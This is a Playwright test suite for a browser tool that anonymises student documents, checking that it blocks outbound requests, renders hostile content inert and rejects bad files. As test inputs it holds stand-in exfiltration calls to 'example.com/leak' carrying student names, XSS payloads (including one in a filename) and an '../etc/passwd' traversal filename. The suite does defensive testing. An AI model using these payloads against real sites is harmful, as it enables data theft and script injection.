/**
 * The failure modes that matter more than detection accuracy: a document that could not
 * be read looking clean, hostile content escaping into the page, and the no-transmission
 * claim being wrong.
 */

import { test, expect } from '@playwright/test';
import { readFile } from 'node:fs/promises';
import { ROSTER, makeDocx, makeImageOnlyPdf, readZip } from './fixtures.js';

const mdFile = (name, content) => ({ name, mimeType: 'text/markdown', buffer: Buffer.from(content, 'utf8') });

test('the security headers are actually served', async ({ page }) => {
  const response = await page.goto('/protect.html');
  const headers = response.headers();
  const csp = headers['content-security-policy'];

  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("object-src 'none'");
  expect(csp).toContain("base-uri 'none'");
  expect(headers['referrer-policy']).toBe('no-referrer');
  expect(headers['x-content-type-options']).toBe('nosniff');
});

test('the page cannot send document content anywhere', async ({ page }) => {
  // What matters is whether bytes leave the browser, so this watches actual requests
  // rather than trusting each API's return value. navigator.sendBeacon in particular
  // returns true once it has *queued* a request; the CSP check happens afterwards, so
  // its return value says nothing about whether the request was allowed.
  // Note that a blocked request still surfaces as a "request" event — the browser
  // creates it and then refuses it. The claim being tested is that none of them
  // COMPLETE, so successes and failures are tracked separately.
  const attempts = [];
  const failures = [];
  const successes = [];
  const isExternal = (url) => !url.startsWith('http://localhost:');

  page.on('request', (request) => { if (isExternal(request.url())) attempts.push(request.url()); });
  page.on('requestfailed', (request) => {
    if (isExternal(request.url())) failures.push(`${request.url()} — ${request.failure()?.errorText ?? 'failed'}`);
  });
  page.on('response', (response) => { if (isExternal(response.url())) successes.push(response.url()); });

  await page.goto('/protect.html');

  const violations = await page.evaluate(async () => {
    const blocked = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      blocked.push(`${event.effectiveDirective}:${event.blockedURI}`);
    });

    const tryIt = async (label, fn) => {
      try { await fn(); return `${label}: no error thrown`; }
      catch (err) { return `${label}: ${err.name}`; }
    };

    const outcomes = [
      await tryIt('fetch', () => fetch('https://example.com/leak', { method: 'POST', body: 'student data' })),
      await tryIt('xhr', () => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://example.com/leak', true);
        xhr.send('student data');
      }),
      await tryIt('beacon', () => navigator.sendBeacon('https://example.com/leak', 'student data')),
      await tryIt('websocket', () => new WebSocket('wss://example.com/leak')),
      await tryIt('image', () => new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = resolve;
        img.onerror = () => reject(new Error('blocked'));
        img.src = 'https://example.com/leak?name=Jane+Smith';
      })),
    ];

    await new Promise((resolve) => setTimeout(resolve, 400));
    return { outcomes, blocked };
  });

  expect(successes, `content reached the network: ${successes.join(', ')}`).toHaveLength(0);
  expect(failures.length, 'every attempted outbound request should be refused').toBe(attempts.length);
  // The browser should also say it refused on policy grounds, not merely that the
  // requests failed — a network error would look the same from the page's side.
  expect(violations.blocked.length, `no CSP violations recorded: ${JSON.stringify(violations)}`).toBeGreaterThan(0);
});

test('no network request is made while a batch is processed', async ({ page }) => {
  const external = [];
  page.on('request', (request) => {
    const url = request.url();
    if (!url.startsWith('http://localhost:') && !url.startsWith('data:') && !url.startsWith('blob:')) {
      external.push(url);
    }
  });

  await page.goto('/protect.html');
  await page.fill('#roster-text', ROSTER);
  await page.setInputFiles('#file-input', [mdFile('Jane Smith - Essay.md', 'Jane Smith wrote this, jsmith@example.edu.')]);
  await page.click('#analyze-btn');
  await expect(page.locator('#step-review')).toBeVisible();

  expect(external, `unexpected external requests: ${external.join(', ')}`).toHaveLength(0);
});

test('a scanned PDF is refused rather than passed through looking clean', async ({ page }) => {
  await page.goto('/protect.html');
  await page.fill('#roster-text', ROSTER);
  await page.setInputFiles('#file-input', [
    { name: 'Jane Smith - Scan.pdf', mimeType: 'application/pdf', buffer: makeImageOnlyPdf() },
  ]);
  await page.click('#analyze-btn');

  await expect(page.locator('#review-messages')).toContainText('could not be checked');
  await expect(page.locator('#review-messages')).toContainText(/scan|image/i);
  // And it is not sitting in the review as an empty, apparently clean document.
  await expect(page.locator('#doctabs button')).toHaveCount(0);
});

test('a corrupted Word file is refused with an explanation', async ({ page }) => {
  await page.goto('/protect.html');
  await page.fill('#roster-text', ROSTER);
  await page.setInputFiles('#file-input', [
    { name: 'broken.docx', mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', buffer: Buffer.from('this is not a zip archive at all') },
  ]);
  await page.click('#analyze-btn');

  await expect(page.locator('#review-messages')).toContainText('could not be checked');
  await expect(page.locator('#review-messages')).toContainText(/corrupted|not a \.docx/i);
});

test('an empty file is refused', async ({ page }) => {
  await page.goto('/protect.html');
  await page.fill('#roster-text', ROSTER);
  await page.setInputFiles('#file-input', [mdFile('empty.md', '')]);
  await page.click('#analyze-btn');
  await expect(page.locator('#review-messages')).toContainText(/empty/i);
});

test('an unsupported file type is rejected before any processing', async ({ page }) => {
  await page.goto('/protect.html');
  await page.setInputFiles('#file-input', [
    { name: 'paper.doc', mimeType: 'application/msword', buffer: Buffer.from('old word format') },
    { name: 'photo.png', mimeType: 'image/png', buffer: Buffer.from('not really a png') },
  ]);
  await expect(page.locator('#file-problems')).toContainText('save it as .docx');
  await expect(page.locator('#file-problems')).toContainText('not a supported file type');
  await expect(page.locator('#filelist li')).toHaveCount(0);
});

test('hostile content in a document is shown as text and never executed', async ({ page }) => {
  const errors = [];
  page.on('pageerror', (err) => errors.push(err.message));

  const payload = [
    '<img src=x onerror="window.__pwned=1">',
    '<script>window.__pwned = 1<\/script>',
    '<iframe src="https://example.com/leak"></iframe>',
    'Jane Smith wrote this.',
  ].join('\n');

  await page.goto('/protect.html');
  await page.fill('#roster-text', ROSTER);
  await page.setInputFiles('#file-input', [mdFile('<img src=x onerror=alert(1)>.md', payload)]);
  await page.click('#analyze-btn');
  await expect(page.locator('#step-review')).toBeVisible();

  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(await page.locator('#preview img, #preview iframe, #preview script').count()).toBe(0);
  // It is on screen, just as inert text.
  await expect(page.locator('#preview')).toContainText('onerror');
  // The filename is displayed too, and is equally inert.
  await expect(page.locator('#doctabs')).toContainText('<img src=x');
  expect(await page.locator('#doctabs img').count()).toBe(0);
  expect(errors).toHaveLength(0);
});

test('a map with a traversal filename cannot write outside the archive', async ({ page }) => {
  // Hand the restore page a hand-built map whose original filename is a path.
  const map = {
    app: 'dia',
    schemaVersion: 1,
    batchId: 'ABCD2345',
    label: 'crafted',
    createdAt: '2026-08-01T00:00:00.000Z',
    documents: [{
      docId: 'd01',
      docToken: '[PP_ABCD2345_D01]',
      protectedFilename: 'PP_ABCD2345_D01.md',
      originalFilename: '../../../../etc/passwd',
      authorTokens: ['[PP_ABCD2345_S01]'],
    }],
    entities: [{
      token: '[PP_ABCD2345_S01]', type: 'PERSON', restoreAs: 'Jane Smith',
      occurrences: [{ docId: 'd01', start: 0, end: 10, source: 'roster-full' }],
    }],
  };

  await page.goto('/restore.html');
  await page.setInputFiles('#map-input', {
    name: 'map.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(map)),
  });
  await expect(page.locator('#map-status')).toContainText('Batch ABCD2345');

  await page.fill('#feedback-text', '## Document [PP_ABCD2345_D01]\n\nGood work [PP_ABCD2345_S01].\n');
  await page.click('#restore-btn');
  await expect(page.locator('#step-result')).toBeVisible();

  const filename = await page.locator('#result-tabs button').first().textContent();
  expect(filename).not.toContain('..');
  expect(filename).not.toContain('/');
  expect(filename).not.toContain('\\');
});

test('a tampered map is refused with the reason shown', async ({ page }) => {
  const cases = [
    ['a duplicate token', {
      app: 'dia', schemaVersion: 1, batchId: 'ABCD2345', documents: [],
      entities: [
        { token: '[PP_ABCD2345_S01]', type: 'PERSON', restoreAs: 'A' },
        { token: '[PP_ABCD2345_S01]', type: 'PERSON', restoreAs: 'B' },
      ],
    }, /duplicate token/i],
    ['a newer schema', {
      app: 'dia', schemaVersion: 99, batchId: 'ABCD2345', documents: [], entities: [],
    }, /newer version/i],
    ['an unexpected field', {
      app: 'dia', schemaVersion: 1, batchId: 'ABCD2345', documents: [], entities: [], surprise: 'hello',
    }, /unexpected field/i],
  ];

  for (const [label, map, expected] of cases) {
    await page.goto('/restore.html');
    await page.setInputFiles('#map-input', {
      name: 'map.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(map)),
    });
    await expect(page.locator('#map-status'), `case: ${label}`).toContainText(expected);
    await expect(page.locator('#restore-btn')).toBeDisabled();
  }
});

test('a protected document offered as a map is rejected clearly', async ({ page }) => {
  await page.goto('/restore.html');
  await page.setInputFiles('#map-input', {
    name: 'PP_ABCD2345_D01.md', mimeType: 'text/markdown',
    buffer: Buffer.from('## Document [PP_ABCD2345_D01]\n\nSome text.\n'),
  });
  await expect(page.locator('#map-status')).toContainText('not valid JSON');
  await expect(page.locator('#restore-btn')).toBeDisabled();
});

test('an oversized batch is refused', async ({ page }) => {
  await page.goto('/protect.html');
  const files = Array.from({ length: 41 }, (_, i) => mdFile(`paper-${i}.md`, 'Jane Smith wrote this.'));
  await page.setInputFiles('#file-input', files);
  await expect(page.locator('#file-problems')).toContainText('Too many files');
});

test('metadata author names never reach the exported map', async ({ page }) => {
  const docx = await makeDocx({ paragraphs: ['An essay with no names in the body text at all.'], author: 'Robert Jones' });

  await page.goto('/protect.html');
  await page.fill('#roster-text', ROSTER);
  await page.setInputFiles('#file-input', [
    { name: 'anonymous-upload.docx', mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', buffer: docx },
  ]);
  await page.click('#analyze-btn');
  await expect(page.locator('#step-review')).toBeVisible();

  await page.click('#to-export-btn');
  const [protectedDownload] = await Promise.all([
    page.waitForEvent('download'), page.click('#download-protected-btn'),
  ]);
  const entries = await readZip(await readFile(await protectedDownload.path()));
  expect(Object.values(entries).join('\n')).not.toContain('Robert Jones');

  await page.uncheck('#encrypt-toggle');
  const [mapDownload] = await Promise.all([
    page.waitForEvent('download'), page.click('#download-map-btn'),
  ]);
  const mapText = (await readFile(await mapDownload.path())).toString('utf8');

  // The author was used to guess whose paper this is, but discovered metadata is not
  // copied into the map: the map should carry no more identifying data than it needs.
  expect(JSON.parse(mapText).documents[0]).not.toHaveProperty('metadataFound');
});
